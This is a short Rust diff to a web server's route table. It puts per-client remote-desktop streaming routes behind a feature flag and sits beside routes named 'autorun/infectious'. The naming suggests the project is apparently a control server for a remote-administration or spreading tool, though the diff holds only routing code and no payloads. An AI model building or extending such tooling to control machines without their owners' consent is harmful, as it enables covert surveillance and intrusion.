@@ -66,8 +66,8 @@ pub async fn run(config: &Config, server_map: Arc<RwLock<ServerMap>>) -> Result<
                                 .service(client::all)
                                 .service(client::get)
                                 .service(client::delete)
-                                .service(
-                                    web::scope("/{addr}")
+                                .service({
+                                    let addr_scope = web::scope("/{addr}")
                                         .service(client::environment::get)
                                         .service(client::notification::get)
                                         .service(
@@ -109,15 +109,17 @@ pub async fn run(config: &Config, server_map: Arc<RwLock<ServerMap>>) -> Result<
                                             web::scope("/autorun")
                                                 .service(client::autorun::infectious::get)
                                                 .service(client::autorun::infectious::post),
-                                        )
-                                        .service(
-                                            web::scope("/rd")
-                                                .service(client::rd::all)
-                                                .service(client::rd::stream::get_mpeg1video)
-                                                .service(client::rd::stream::get_rgb)
-                                                .service(client::rd::stream::get_yuv),
-                                        ),
-                                ),
+                                        );
+                                    #[cfg(feature = "rd")]
+                                    let addr_scope = addr_scope.service(
+                                        web::scope("/rd")
+                                            .service(client::rd::all)
+                                            .service(client::rd::stream::get_mpeg1video)
+                                            .service(client::rd::stream::get_rgb)
+                                            .service(client::rd::stream::get_yuv),
+                                    );
+                                    addr_scope
+                                }),
                         )
                         .service(
                             web::scope("/server")
